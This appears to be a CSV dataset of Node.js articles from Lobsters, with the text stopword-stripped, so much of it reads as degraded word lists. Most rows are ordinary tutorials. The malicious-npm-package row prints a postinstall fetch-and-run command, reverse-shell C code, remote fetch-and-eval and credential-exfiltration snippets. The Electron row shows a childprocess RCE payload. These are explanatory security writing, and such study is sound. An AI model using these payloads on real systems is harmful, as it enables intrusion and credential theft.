ID,Source,Tag_Code,Tag_Name,Title,Url,ProcessdedTitle,WeightedContent,Content
1,Lobsters,nodejs,Node.js programming,"Building a Modern Backend with TypeScript, PostgreSQL and Prisma: REST API, Validation, and Testing",https://www.prisma.io/blog/modern-backend-2-dcba1ps7kip3/,building modern backend typescript postgresql prisma rest api validation testing,introduction grading system online course series cover part part part learn today first article hapi rest api validation testing jest note checkpoint prerequisite assumed knowledge development environment nodejs docker prisma extension note local postgresql database hosted postgresql database heroku clone repository github note start postgresql note building rest api api rest github rest api endpoint path http method handler http status code list note api endpoint note github repository note hapi hapi creating server checkpoint http defining route checkpoint http moving route plugin plugins server interface checkpoint http defining test status endpoint jest note setup teardown checkpoint defining primsa plugin note comment checkpoint defining plugin user route dependency prisma plugin defining create user route type assertion note article adding validation create user route create test create user route note checkpoint defining testing get user route note checkpoint defining testing delete user route note checkpoint defining testing update user route method dry checkpoint summary next step github prisma data guide,introductionthe goal series explore demonstrate different pattern problem architecture modern backend solving concrete problem grading system online course good example feature diverse relation type complex enough represent realworld use casethe recording live stream available cover ground articlewhat series coverthe series focus role database every aspect backend development covering topicpartdata modelingpart api layerpart current validationpart current testingpart current authenticationcoming upauthorizationcoming upintegration external apiscoming updeploymentcoming upwhat learn todayin first article designed data model problem domain wrote seed script us prisma client save data databasein second article series build rest api top data model prisma schema first article use hapi build rest api rest api able perform database operation via http requestsas part rest api develop following aspect rest api implement http server resource endpoint handle crud different model integrate prisma hapi allow accessing prisma client api endpoint handlersvalidation add payload validation rule ensure user input match expected type prisma schematesting write test rest endpoint jest hapi serverinject simulate http request verifying validation persistence logic rest endpointsby end article rest api endpoint crud create read update delete operation test rest resource map http request model prisma schema eg get user endpoint handle operation associated user modelthe next part series cover aspect list detailnote throughout guide find various checkpoint enable validate whether performed step correctlyprerequisitesassumed knowledgethis series assumes basic knowledge typescript nodejs relational database experienced javascript nt chance try typescript still able follow along series use postgresql however concept apply relational database mysql additionally familiarity rest concept useful beyond prior knowledge prisma required covered seriesdevelopment environmentyou following installed nodejsdocker used run development postgresql database using visual studio code prisma extension recommended syntax highlighting formatting helpersnote nt want use docker set local postgresql database hosted postgresql database herokuclone repositorythe source code series found githubto get started clone repository install dependency git clone b git cd realworldgradingapp npm install note checking branch able follow article starting pointstart postgresqlto start postgresql run following command realworldgradingapp folder dockercompose note docker use dockercomposeyml file start postgresql containerbuilding rest apibefore diving implementation go basic concept relevant context rest apis api application programming interface set rule allow program talk typically developer creates api server allows client talk itrest set convention developer follow expose staterelated case state stored database operation http request example check github rest apiendpoint entry point rest api following property nonexhaustive path eg user used access user endpoint path determines url used access endpoint eg wwwmyapicomusershttp method eg get post delete http method determine type operation endpoint expose example get user endpoint allow fetching user post user endpoint allow creating usershandler code case typescript handle request endpointhttp status code response http status code inform api consumer whether operation successful error occurred check list different http status code eg resource created successfully consumer input fails validationnote one key objective rest approach using http application protocol avoid reinventing wheel sticking conventionsthe api endpointsthe api following endpoint http method followed path resourcehttp methodroutedescriptionuserpostuserscreate user optionally associate course usergetusers userid get useruserputusers userid update useruserdeleteusers userid delete userusergetusersget userscourseenrollmentgetusers userid coursesget user enrollement incoursescourseenrollmentpostusers userid coursesenroll user course student teacher courseenrollmentdeleteusers userid course courseid delete user enrollment coursecoursepostcoursescreate coursecoursegetcoursesget coursescoursegetcourses courseid get coursecourseputcourses courseid update coursecoursedeletecourses courseid delete coursetestpostcourses courseid testscreate test coursetestgetcoursestests testid get testtestputcoursestests testid update testtestdeletecoursestests testid delete testtest resultgetusers userid testresultsget user test resultstest resultpostcoursestests testid testresultscreate test result test associated usertest resultgetcoursestests testid testresultsget multiple test result testtest resultputcoursesteststestresults testresultid update test result associated user test test resultdeletecoursesteststestresults testresultid delete test resultnote path containing parameter enclosed eg userid represent variable interpolated url eg userid endpoint grouped based main modelresource associated categorization help organizing code separate module maintainabilityin article implement subset endpoint first four illustrate different pattern different crud operation full api available github repository endpoint provide interface operation resource delete endpoint deleting resource added laternote throughout article word endpoint route used interchangeably refer thing endpoint term used context rest route term used context http servershapithe api built hapi nodejs framework building http server support validation testing boxhapi consists core module named hapihapi http server module extend core functionality backend also use following hapijoi declarative input validation hapiboom httpfriendly error objectsfor hapi work typescript need add type hapi joi necessary hapi written javascript adding type rich autocompletion allow typescript compiler ensure type safety codeinstall following package npm install save hapiboom hapihapi hapijoi npm install savedev typeshapihapi typeshapijoi creating serverthe first thing need create hapi server bind interface portadd following hapi server srcserverts import hapi hapihapi const server hapiserver hapiserver port processenvport host processenvhost localhost export async function start promise hapiserver await serverstart return server processon unhandledrejection err consolelog err processexit start server consolelog server running serverinfouri catch err consolelog err first import hapi initialize new hapiserver type hapiserver defined typeshapihapi package connection detail containing port number listen host information start server log runningto run server locally development run npm devscript use tsnodedev automatically transpile typescript code restart server make change npm run dev npm run dev tsnodedev respawn srcserverts using tsnode version typescript version server running http checkpoint open http browser see following statuscode error found message found congratulation successfully created server however server route defined next step define first routedefining routeto add route use route method hapi server instantiated previous step defining route related business logic good practice add status endpoint return http status code useful ensure server running correctlyto update start function serverts adding following top export async function start promise hapiserver serverroute method get path handler h hapiresponsetoolkit return hresponse true code await serverstart consolelog server running serverinfouri return server defined http method path handler return object true lastly set http status code open http browser see following true moving route pluginin previous step defined status endpoint since api expose many different endpoint wo nt maintainable defined start functionhapi concept plugins way breaking backend isolated piece business logic plugins lean way keep code modular step move route defined previous step pluginthis requires two step define plugin new fileregister plugin calling serverstart defining pluginbegin creating new folder src named plugins mkdir srcplugins create new file named statusts srcplugins folder touch srcpluginsstatusts add following file import hapi hapihapi const plugin hapiplugin undefined name appstatus register async function server hapiserver serverroute method get path handler h hapiresponsetoolkit return hresponse true code export default plugin hapi plugin object name property register function would typically encapsulate logic plugin name property plugin name string used unique keyeach plugin manipulate server standard server interface appstatus plugin server used define status route register functionregistering pluginto register plugin go back serverts import status plugin follows import status pluginsstatus start function replace route call previous step following serverregister call export async function start promise hapiserver await serverregister status await serverstart consolelog server running serverinfouri return server checkpoint open http browser see following true congratulation successfully created hapi plugin encapsulates logic status endpointin next step define test test status endpointdefining test status endpointto test status endpoint use jest test runner together hapi serverinject test helper simulates http request server allow verify correctly implemented endpointsplitting serverts two filesto use serverinject method need access test server object plugins registered prior starting server avoid server listening request test run modify serverts look follows const server hapiserver hapiserver port processenvport host processenvhost localhost export async function createserver promise hapiserver await serverregister statusplugin await serverinitialize return server export async function startserver server hapiserver promise hapiserver await serverstart consolelog server running serverinfouri return server processon unhandledrejection err consolelog err processexit split replaced start function two function createserver register plugins initializes serverstartserver start servernote hapi serverinitialize initializes server start cache finalizes plugin registration start listening connection portnow import serverts use createserver test initialize server call serverinject simulate http requestsnext create new entry point application call createserver startserver create new srcindexts file add following import createserver startserver server createserver startserver catch err consolelog err lastly update dev script packagejson start srcindexts instead srcserverts dev tsnodedev respawn srcserverts dev tsnodedev respawn srcindexts creating testto create test create folder named test root project create file named statustestts add following file import createserver srcserver import hapi hapihapi describe status plugin let server hapiserver beforeall async server await createserver afterall async await serverstop test status endpoint return async const re await serverinject method get url expect resstatuscode toequal const response jsonparse respayload expect responseup toequal true test beforeall afterall used setup teardown function create stop serverthen serverinject called simulate get http request root endpoint test asserts http status code payload ensure match handlercheckpoint run test npm test see following output pas testsstatustestts status plugin status endpoint return m test suite passed total test passed total snapshot total time estimated ran test suite congratulation created plugin route tested routein next step define prisma plugin access prisma client instance throughout applicationdefining primsa pluginsimilar created status plugin create new file srcpluginsprismats file prisma pluginthe goal prisma plugin instantiate prisma client make available rest application serverapp object disconnect database server stopped serverapp provides safe place store serverspecific runtime application data without potential conflict framework internals data accessed whenever server accessibleadd following srcpluginsprismats file import prismaclient prismaclient import hapi hapihapi const prismaplugin hapiplugin null name prisma register async function server hapiserver const prisma new prismaclient serverappprisma prisma serverext type onpoststop method async server hapiserver serverappprismadisconnect export default prismaplugin define plugin instantiate prisma client assign serverapp add extension function thought hook run onpoststop event get called server connection listener stoppedto register prisma plugin import plugin serverts add array passed serverregister call follows await serverregister status prisma using vscode see red squiggly line serverappprisma prisma srcpluginsprismats file first type error encounter nt see line run compile script run typescript compiler npm run compile error property prisma exist type serverapplicationstate serverappprisma prisma reason error modified serverapp without updating type resolve error add following top prismaplugin definition declare module hapihapi interface serverapplicationstate prisma prismaclient augment module assign prismaclient type serverappprisma propertynote information module augmentation necessary check comment definitelytyped repositorybesides appeasing typescript compiler also make autocompletion work whenever serverappprisma accessed throughout applicationcheckpoint run npm run compile error emittedwell done defined two plugins made prisma client available rest application next step define plugin user routesdefining plugin user route dependency prisma pluginyou define new plugin user route plugin need make use prisma client defined prisma plugin perform crud operation userspecific route handlershapi plugins optional dependency property used indicate dependency plugins specified hapi ensure plugins loaded correct orderbegin creating new file srcpluginsusersts file user pluginadd following file import hapi hapihapi const usersplugin name appusers dependency prisma register async function server hapiserver export default usersplugin passed array dependency property make sure hapi load prisma plugin firstyou define userspecific route register function knowing prisma client accessiblelastly need import plugin register srcserverts follows await serverregister status prisma await serverregister status prisma user next step define create user endpointdefining create user routewith user plugin defined define create user routethe create user route http method post path usersbegin adding following serverroute call srcpluginsusersts inside register function serverroute method post path user handler createuserhandler define createuserhandler function follows async function createuserhandler request hapirequest h hapiresponsetoolkit const prisma requestserverapp const payload requestpayload try const createduser await prismausercreate data firstname payloadfirstname lastname payloadlastname email payloademail social jsonstringify payloadsocial select id true return hresponse createduser code catch err consolelog err access prisma serverapp object assigned prisma plugin use request payload prismausercreate call save user databaseyou see red squiggly line line accessing payload property indicating type error nt see error run typescript compiler npm run compile error property firstname exist type string object buffer readable property firstname exist type string firstname payloadfirstname payload value determined runtime typescript compiler way knowing time fixed type assertion type assertion mechanism typescript allows override variable inferred type typescript type assertion purely telling compiler know type better hereto define interface expected payload interface userinput firstname string lastname string email string social facebook string twitter string github string website string note type interface many similarity typescript learn difference check articlethen add type assertion const payload requestpayload userinput plugin look follows const usersplugin name appusers dependency prisma register async function server hapiserver serverroute method post path user handler registerhandler export default usersplugin interface userinput firstname string lastname string email string social facebook string twitter string github string website string async function registerhandler request hapirequest h hapiresponsetoolkit const prisma requestserverapp const payload requestpayload userinput try const createduser await prismausercreate data firstname payloadfirstname lastname payloadlastname email payloademail social jsonstringify payloadsocial select id true return hresponse createduser code catch err consolelog err adding validation create user routein step also add payload validation using joi ensure route handle request correct datavalidation thought runtime type check using typescript type check compiler performs bound known compile time since user api input known compiletime runtime validation help casesto import joi follows import joi hapijoi joi allows define validation rule creating joi validation object assigned route handler hapi know validate payloadin create user endpoint want validate user input fit type defined interface userinput firstname string lastname string email string social facebook string twitter string github string website string joi corresponding validation object would look follows const userinputvalidator joiobject firstname joistring required lastname joistring required email joistring email required social joiobject facebook joistring optional twitter joistring optional github joistring optional website joistring optional optional next configure route handler use validator object userinputvalidator add following route definition object method post path user handler registerhandler option validate payload userinputvalidator create test create user routein step create test verify create user logic test make request post user endpoint serverinject check response includes id field thereby verifying user created databasestart creating testsusersteststs file add following content import createserver srcserver import hapi hapihapi describe post user create user let server hapiserver beforeall async server await createserver afterall async await serverstop let userid test create user async const response await serverinject method post url user payload firstname testfirstname lastname testlastname email test datenow prismaio social twitter thisisalice website http wwwthisisalicecom expect responsestatuscode toequal userid jsonparse responsepayload id expect typeof userid number tobetruthy test injects request payload asserts statuscode id response numbernote test avoids unique constraint error ensuring email unique every test runnow written test happpy path creating user sucessfully write another test verify validation logic crafting another request invalid payload eg ommitting required field firstname follows test create user validation async const response await serverinject method post url user payload lastname testlastname email test datenow prismaio social twitter thisisalice website http wwwthisisalicecom consolelog responsepayload expect responsestatuscode toequal checkpoint run test npm test command verify test passdefining testing get user routein step first define test get user endpoint implement route handleras reminder get user endpoint get user userid signaturethe practice first writing test implementation often referred testdriven development testdriven development improve productivity providing fast mechanism verify correctness change work implementationdefining testfirst test route returning user foundopen userstestts file add following test test get user return non existant user async const response await serverinject method get url expect responsestatuscode toequal second test test happy path successfully retrieved user use userid variable set create user test created previous step ensure fetch existing user add following test test get user return user async const response await serverinject method get url user userid expect responsestatuscode toequal const user jsonparse responsepayload expect userid tobe userid since nt defined route yet running test result failing test next step define routedefining routego usersts user plugin add following route object serverroute call serverroute method get path user userid handler getuserhandler option validate params joiobject userid joinumber integer similar defined validation rule create user endpoint route definition validate userid url parameter ensure number passednext define getuserhandler function follows async function getuserhandler request hapirequest h hapiresponsetoolkit const prisma requestserverapp const userid parseint requestparamsuserid try const user await prismauserfindone id userid user return hresponse code else return hresponse user code catch err consolelog err return boombadimplementation note calling findone prisma return null result could foundin handler userid parsed request parameter used prisma client query user found returned otherwise found user object returnedcheckpoint run test npm test verify test passeddefining testing delete user routein step define test delete user endpoint implement route handlerthe delete user endpoint delete user userid signaturedefining testfirst write test route parameter valdation add following test userstestts test delete user fails invalid userid parameter async const response await serverinject method delete url expect responsestatuscode toequal add another test delete user logic delete user created create user test test delete user async const response await serverinject method delete url user userid expect responsestatuscode toequal note status response code indicates request succeeded response contentdefining routego usersts user plugin add following route object serverroute call serverroute method delete path user userid handler deleteuserhandler option validate params joiobject userid joinumber integer defined route define deleteuserhandler follows async function deleteuserhandler request hapirequest h hapiresponsetoolkit const prisma requestserverapp const userid parseint requestparamsuserid try await prismauserdelete id userid return hresponse code catch err consolelog err return hresponse code checkpoint run test npm test verify test passeddefining testing update user routein step define test update user endpoint implement route handlerthe update user endpoint put user userid signaturewriting test update user routefirst write test route parameter valdation add following test userstestts test update user fails invalid userid parameter async const response await serverinject method put url expect responsestatuscode toequal add another test update user endpoint update user firstnameand lastname field user created create user test test update user async const updatedfirstname testfirstnameupdated const updatedlastname testlastnameupdated const response await serverinject method put url user userid payload firstname updatedfirstname lastname updatedlastname expect responsestatuscode toequal const user jsonparse responsepayload expect userfirstname toequal updatedfirstname expect userlastname toequal updatedlastname defining update user validation rulesin step define update user route term validation endpoint payload require specific field unlike create user endpoint email firstname lastname required allow use endpoint update single field eg firstnameto define payload validation could use userinputvalidator joi object however recall field required const userinputvalidator joiobject firstname joistring required lastname joistring required email joistring email required social joiobject facebook joistring optional twitter joistring optional github joistring optional website joistring optional optional update user endpoint field optional joi provides way create different alteration joi object using tailor alter method especially useful defining create update route similar validation rule keeping code dryupdate already defined userinputvalidator follows const userinputvalidator joiobject firstname joistring alter create schema schemarequired update schema schemaoptional lastname joistring alter create schema schemarequired update schema schemaoptional email joistring email alter create schema schemarequired update schema schemaoptional social joiobject facebook joistring optional twitter joistring optional github joistring optional website joistring optional optional const createuservalidator userinputvalidatortailor create const updateuservalidator userinputvalidatortailor update updating create user route payload validationnow update create user route definition use createuservalidator srcpluginsusersts user plugin method post path user handler createuserhandler option validate payload userinputvalidator payload createuservalidator defining update user routewith validation object update defined define update user route go srcpluginsusersts user plugin add following route object serverroute call serverroute method put path user userid handler updateuserhandler option validate params joiobject userid joinumber integer payload createuservalidator defined route define updateuserhandler function follows async function updateuserhandler request hapirequest h hapiresponsetoolkit const prisma requestserverapp const userid parseint requestparamsuserid const payload requestpayload partial userinput try const updateduser await prismauserupdate id userid data payload return hresponse updateduser code catch err consolelog err return hresponse code checkpoint run test npm test verify test passedsummary next stepsif made far congratulation article covered lot ground starting rest concept going hapi concept route plugins plugin dependency testing validationyou implemented prisma plugin hapi making prisma available throughout application implemented route make use itmoreover typescript helped autocompletion verifying correct use type sync database schema throughout applicationthe article covered implementation subset endpoint next step could implement route following principlesyou find full source code backend githubthe focus article implementing rest api however concept validation testing apply situation toowhile prisma aim make working relational database easy helpful deeper understanding underlying databasecheck prisma data guide learn database work choose right one use database application full potentialin next part series learn authentication implementing passwordless authentication email jwtcontinues integration building github action pipeline automate testing backendintegration external apis using transactional email api send emailsauthorization provide different level access different resourcesdeployment
2,Lobsters,nodejs,Node.js programming,The Anatomy of a Malicious Package,https://blog.phylum.io/malicious-javascript-code-in-npm-malware/,anatomy malicious package,attacker motivation mentality onhost actually observed javascript malware run crawl identification might end nearly impossible walk malware added upstream add backdoor go next,malicious package actually look like practice walk hypothetical exercise see malware generally work sort function might expect relatively simple temporary complex additionally focused primarily javascript post really need think two different threat model inbrowser malware look like going differ onhost malware primary attack method could attacker feasibly accomplish level access malware historically done context end actually split series article first post begin examine onhost javascript malware look like followed indepth look make malware stealthier resistant removal finally last set post delve browserbased malware accomplish within browser sandboxattacker motivation mentalityas begin thought experiment first thing consider potential attacker target goal would focus npm specifically article primarily give good survey several platform inbrowser v onsystem differing threat model general process methodology concern remain across platform language ecosystemsonhostthe whole concept onhost malware npm package seems bit unintuitive first blush immediate association generally browserfocused concern must safe since run browser sandbox reality however onhost actually observed javascript malware run interestingly enough serious advantage attacker perspective running rather end user web browser run outside browser level access developer installing packagerunning within large mainstream package enduser browser increase odds discovered many product user observing package behavior endpoint build processto add last point many security product actually ignore thing like devdependencies entirely many infrastructure piece ci builder buildrelated code run littletonothing term security measure mitigationswhile certainly nt mean restricted operating onhost see later plenty inbrowser make compelling place begin journey walk iterative process making badware package applying gradual improvementscrawlto start project build simple npm package exactly value provide largely irrelevant argument sake might change console font color include picture cat practice simply exists bundle malwarein order malware even moderately successful need three element gain executionnetwork accessto ensure user remains unaware runningto get might consider basic form item one take page prior work leverage great feature javascript tooling postinstall script end start packagejson name mostlyharmless version script postinstall wget http probablybadmalware chmod x malware malware least wo nt make malware complex perhaps simply start something like following include systypesh include syssocketh include netinetinh include arpaineth include sysstath include syswaith include errnoh include fcntlh include unistdh include stdlibh include stdioh include stringh int main int argc char argv struct sockaddrin addr unsigned short port const char netaddr int sock addrsinfamily afinet addrsinport htons port inetaton netaddr addrsinaddr return sock socket afinet sockstream return connect sock struct sockaddr addr sizeof addr goto cleanup sock stdoutfileno goto cleanup sock stdinfileno goto cleanup sock stderrfileno goto cleanup execlp binbash bash null cleanup close sock return simple reverse shella small program essentially give u reverse shell first opening socket connecting remote server redirecting stdinstdoutstderr new socket executing bash full console access local machine context current user presumably either developer ci runner certainly work give u access come serious limitation one fairly trivial detect simple netstat identify easily another issue ready accept connection soon user run npm install try connect die current user log barring detached terminal similar finally overt would network security device id ip catch traffic inflight even casual observer would find perusing packagejson oddly enough however last point least regarding packagejson le bad one might think trivial observation would certainly catch malware upstream nontrivial package installation manual identification might end nearly impossible fact documented backstabber knife collection linked earlier article sort scheme worked large subset discovered javascript malware still almost certainly betterwalk notional infection vector via postinstall script code give u access remote host go look improving setup draw inspiration malware added upstream eslint harvested shipped token credential local system effectively giving attacker ability modify previouslypublished package controlled current user future datewhile actually obtaining credential focusing single file small number credential may may machine land seems bit lackluster look locally stored credential eg aws token ssh key etc environment variablesin order get new functionality running start making quick change previous packagejson name mostlyharmless version script postinstall node libbuildjs instead running new malware directly file make slightly stealthier remotehosting file pulling runtime quick first pas might resemble following try const http require http httpsget hostname probablybad path newmalware header accept texthtml re reson data eval error catch e interestingly enough actually almost exactly malware launched aforementioned eslint attack would pull file retrieval script remote host slotted hypothetical attack domain probablybad original utilized pastebin simply eval text mostly effective critical flaw reason nt get entire script execute first chunk eval likely fail syntax error might attempting execute half script reference copy original malware deeper explanation attack constituent part found ended resulting attack discovered quickly certainly first issue relatively simple fix need ensure downloaded full file attempt eval end probably want something like following try const http require http httpsget http probablybadnewmalware re let tmp reson data tmp reson end eval tmp error catch e get u consistent execution least think harvesting npm cred crypto wallet really best think bit two general context run developer systemon ci runnerfrom attacker perspective place interesting albeit slightly different reason first case answer somewhat obvious going running developer workstation project built tested locally mean thing like credential npm cred ssh key many likely available access exfiltration among thing second scenario however also interesting ci runner often get sensitive item database credential infrastructure key similar injected build process past experience also show attacker historically used opportunity add backdoor stage infecting project system realistically enumerating file environment variable give attacker providing proverbial key kingdom term access instead simply accessing single file user home directory one lingering concern however linked malware essentially provided extracted credential part get remote server exfiltration method mostly worked case due simply fact data retrieving relatively small least approximating fixedlength u quickly run issue seeminglysmall change transitioned extracting small fixedlength file sending back potentially many megabyte data spread number file environment variable various type encoding order fix allow u slightly stealthier could spend lot time thinking improve thing beyond scope article really need normalize encoding ensure sending much data time push content back remote server end start following snippet code contain temporary data read file env var let exfil essentially call function per item name filename env var tp either file env data raw blob data const process name tp data exfil objectassign exfil name tp bufferfrom data tostring processed data exfiltration easily iterate object send back namecontent pair variety endpoint perhaps alternating get post least variety action wanted even stealthier might combine together encrypt content send back variable sized chunkswhere go nextwe discussed quite bit depth bare minimum required bake malware upstream library however simply beginning discussion many part handling persistence run user log system extending tooling probably want little better first effort improving stealthiness working around limitation platform additional item consider short technically met stated goal first step toward building malicious package still much room improvement especially noting tactic technique procedure ttps described nearly exhibited live malware much rapidly convicted want push boundary bit discus sophisticated technique dig much topic followon post
3,Lobsters,nodejs,Node.js programming,Pilo: Raspberry Pi Powered Lights-Out Remote Server Management for $60 or less,https://zach.bloomqu.ist/blog/2020/08/pilo-raspberry-pi-lights-out-management.html,pilo raspberry pi powered lightsout remote server management le,lightsout management lom ipmi building keyboard controller using raspberry pi zero usb host pihole bitbang many many read short program power control via capturing video output amazon creating application download video instead github repo pilo cypress github action workflow packaging pilo soldered underside tutorial part list microcenter amazon amazon setup snugly myriad reason,completed pilo controller final installation usb capture card arduino nano usb serial soldered underside like many geek home server made offtheshelf consumergrade pc part run weekend programming project game server friend website recently power event house caused server reboot power came back server booted stuck boot screen waiting enter disk decryption passphrase luckily home asleep time woke realized something amiss able plug keyboard enter passphrase event got thinking home time another country someday move server outside house need regularly access physical screen keyboard real server world solution known lightsout management lom every major server manufacturer flavor hp ilo integrated lightsout even industry standard like ipmi define common interface lom implementation commonly supported function lom system include controlling keyboard mouse input controlling power button status restart shutdown force seeing raw video output motherboard even preboot even bios mounting isos disk decided make raspberry pibased lom thing help decrease stress next time leave house extended period time like introduce pilo pi lightsout note post describes arrived final design system want instruction setting start reading tutorial building keyboard controller started looking way use pi send keyboard command computer problem discovered existing method rely using raspberry pi zero usb host disables using onboard usb port purpose additionally method work board like raspberry pi problematic wanted use due onboard ethernet fact one kicking around previous pihole deployment suitable solution would emulate keyboard via gpio pin pi would theoretically affect existing usb device could used model pi pi zero started looked trying bitbang usb human interface device protocol via pi gpio pin pretty quickly hit dead end many many existing discussion web bitbanging usb protocol pi consensus seems raspberry pi gpio slow emulate usb even could output bit fast enough act usb device implementation would extremely buggy nonrealtime nature linux o read usb way send keypresses computer almost decade usb standard twinkle compaq eye ibm using standard confused connect mouse keyboard pc still feasible use pi bitbang protocol use arduino daughterboard library handle nittygritty serial protocol arduino nano pictured left plugged directly combo port back motherboard ignore unused wire red originally planned cutting end cable making nice goodwill near junk turn breadboard wire fit ohsosnugly din hole gon na arduino nano flashed short program make act dumb pipe blindly shuttle byte arduino usb serial port connection motherboard mean logic keyboard command sent written piside nice mean never reflash arduino update keyboard logic note currently pilo built control keyboard input since oriented towards server use would possible add mouse output additional hardware wire mouse clk data gnd unless using combo port library contains function mouse control well power control via originally thought going wire relay motherboard reset pin allow pilo control computer power approach diyipmi another similar project us however researching keyboard controller rediscovered longlost secret standard acpi key acpi advanced configuration power interface set power management standard pc standard define power wakeup sleep key scancodes used control power status pc like power button front box shortpress power key request o shutdown however motherboard longpress power seem force power almost bios support using acpi key power system powered state option look like bios acpi poweredoff state known option enabled sending power scancode boot computer state arduino two responsibility pilo send regular keypresses computer send power command computer save u install relay motherboard reset pin capturing video output server gpu hdmi output decided use usb hdmi capture card get video feed pilo found one amazon connected pi act regular usb webcam available devvideox project experience streaming video web decided use userspace component set http video server make easy set simple mjpeg stream goofiest possible video stream frame stream full jpeg image sent real time imagine lightest bandwidth easy embed web browser support embedding img tag img src streammjpeg configured listen localhost idea could reverseproxy connection video stream provide security creating application pilo interface decided go web app instead something like vnc actual ipmi protocol mostly due background web development fact app accessed web browser something every computer installed short video showing completed pilo app action browser nt support webms download video instead find github repo pilo consists two major component frontend us vanilla htmlcssjs display interface translate keypresses communicate server via websockets server http server written nodejs authenticates request using http basic auth communicates keyboard controller via serialport library manages reverseproxying video stream also endtoend test folder use cypress test application real web browser run firefox chrome every commit ci via github action workflow readme contains information building testing project interested contributing built package also published npm production use packaging pilo one goal building pilo make small enough fit inside server case check photo see fit left server case embedding pilo right server case embedding pilo hdmi ethernet microusb power routed leftmost pcie slot routed io shield topright pilo sits atop ledge bottomright image picture final assembly made outer photo pi usb device soldered underside save space inset photo final package taped ready install cable coming hot glue tape make solderer completed package fit within bounding box slightly larger pi x x mean pilo fit conveniently standard hard drive bay tutorial part list raspberry pi microcenter everywhere else micro linux computer even pi zero could work using wifi need usb hub arduino serial set arduino serial via gpio arduino nano amazon arduino would work well need clk data output converted since serial connection expects usb hdmi capture card compatible card amazon optional plug make tidy connection supply wire soldering iron need solder microsd card microusb power supply come roughly buy everything cheapest lucky enough live near microcenter setup getting started make sure device ready debianbased o like raspbian dietpi installed pi microsd card flash program arduino nano connect everything according beautiful wiring diagram ethernet raspi usb power power usb usb plug hdmi capture card server hdmi keyboard port data arduino nano clk gnd connect data clk gnd arduino nano directly respective pin keyboard port motherboard consult internet reference pinout dress scavenging spare pigtail stripping end breadboard wire also fit snugly din port turn server connecting disconnecting anything tofrom port port designed hotplugging mind risk damaging component o likely detect hotplugged device bother connect pin port vin arduino bad idea myriad reason set mjpeg streaming server usb hdmi capture card follow instruction website install apt source note debian buster user apt repo buster yet stretch repo seem work fine buster update apt index install required package apt update apt install retrieve usb hdmi capture card id running lsusb hexadecimal string like start server listening substituting device id driver uvc deviceid autovideonr serveroption serveroption able access mjpeg stream usb hdmi capture card locally pi http able access network since bound localhost bindhostaddress set command run every boot example adding etcrclocal time generate auth credential follow algorithm think secure username password example foo bar join colon example foo bar result example authsha install nodejs npm install latest distribution pilo npm npm install global pilo may need pas unsafeperms installing root start pilo port running command authsha set environment variable pilo able access pilo http yourpiip using username password created earlier add command etcrclocal run boot
4,Lobsters,nodejs,Node.js programming,Terminate busboy from reading more request with unpipe() and work queue,https://bytearcher.com/articles/terminate-busboy/,terminate busboy reading request unpipe work queue,wrap common error handling code prevent data fed busboy unpipe prevent already piped data busboy internal buffer firing event pqueue,busboy goto library efficiently reading multipartformdata file upload request instead writing intermediate file disk buffering memory busboy us stream give access file data arrives use stream write resilient app offloads file nodejs server external file storage server like aws easy setup busboy start reading incoming request little trickier terminate busboy prevent reading request might need prematurely terminate processing case internal error happens app notice received data invalid want send http response soon possible waste resource processing request setup busboy code like const busboy require busboy const express require express const router new expressrouter routerpost req re next const busboy new busboy header reqheaders busboyon field name value busboyon file name stream filename encoding contenttype busboyon finish reqpipe busboy cancel processing need two step need prevent data fed request busboy calling unpipe need prevent event firing based already piped data stored busboy internal buffer routing handler work queue pause wrap common error handling code first need place put error handling code wrap field file finish event handler trycatch logic placed error handling function case error delegate error expressjs builtin error handler calling next e get code like async function handleerror fn try await fn catch e next e busboyon field name value handleerror busboyon file name stream filename encoding contenttype handleerror busboyon finish handleerror prevent data fed busboy unpipe case error happens stop feeding incoming request busboy calling unpipe previously pipe request object async function handleerror fn try await fn catch e requnpipe busboy next e prevent already piped data busboy internal buffer firing event busboy wo nt receive piece incoming request stream work chunk kb data may already piped data stored busboy internal buffer contains unprocessed field file especially case uploaded file small need prevent previously piped data causing field file event handler fired routing work done event handler work queue case error stop work queue processing work thus stop event processed use pqueue package work queue implementation setting concurrency ensures one event processed time giving u result want const busboy require busboy const express require express const pqueue require pqueue const router new expressrouter routerpost req re next const busboy new busboy header reqheaders const workqueue new pqueue concurrency async function handleerror fn workqueueadd async try await fn catch e requnpipe busboy workqueuepause next e busboyon field name value handleerror busboyon file name stream filename encoding contenttype handleerror busboyon finish handleerror reqpipe busboy case error happens pause work queue processing already queued event unprocessed event lurking internal buffer prematurely terminate busboy processing incoming request respond swiftly caller related article
5,Lobsters,nodejs,Node.js programming,Automatically Generated Posters of Chess Games,https://checkmateposters.com/,automatically generated poster chess game,sample,sample click sample view editor
6,Lobsters,nodejs,Node.js programming,Open Sesame: Escalating Open Redirect to RCE with Electron Code Review,https://spaceraccoon.dev/open-sesame-escalating-open-redirect-to-rce-with-electron-code-review,open sesame escalating open redirect rce electron code review,node world live webpack exploder electron builtin chromium devtools recommends packaging application asar archive one x away popping calc whitebox exploit discovering vulnerable config classic electron calc payload attempting x pwned bypassing csp electron keyboard shortcut module intigriti easter x challenge room ment boilerplate code electron documentation mentioned previously driveby code execution world live,node world live better worse nodejs rocketed developer popularity chart thanks framework like react react native electron developer easily build client mobile native platform client delivered essentially thin wrapper around single javascript file modern convenience tradeoff security side thing moving routing templating logic client side make easier attacker discover unused api endpoint unobfuscated secret check webpack exploder tool wrote decompiles webpacked react application original source code native desktop application electron application even easier decompile debug instead wading heap assembly code attacker use electron builtin chromium devtools meanwhile electron documentation recommends packaging application asar archive tarlike format unpacked simple oneliner source code attacker search clientside vulnerability escalate code execution funky buffer overflow needed electron nodeintegration setting put application one x away popping calc danger x electron app demonstrated jasmin landry love whitebox approach testing application know looking zoom weak point follow exploit pass code blog post go whitebox review unnamed electron application bug bounty program demonstrate escalated open redirect remote code execution help debugging code sample modified anonymized whitebox exploit journey began one day spotted jasmin tweet inspired electron hacking began installing application macos retrieved source code browse application folder rightclick application select show package content enter content directory contains appasar file run npx asar extract appasar source node installed view decompiled source code new source directory discovering vulnerable config peeking packagejson found configuration main appindexjs telling main process initiated indexjs file quick check indexjs confirmed nodeintegration set true browserwindow instance meant could easily escalate attackercontrolled javascript native code execution nodeintegration true javascript window access native nodejs function require thus import dangerous module like childprocess lead classic electron calc payload require childprocess execfile applicationscalculatorappcontentsmacoscalculator function attempting x find x vector application crossplatform collaboration tool think slack zoom plenty input like text message shared uploads launched app source code electron proxying web traffic burp suite began testing html payload like b pwned b input long got first pwned promising sign however standard x payload like script alert script svg onloadalert simply failed execute needed start debugging bypassing csp default access devtools electron application keyboard shortcut 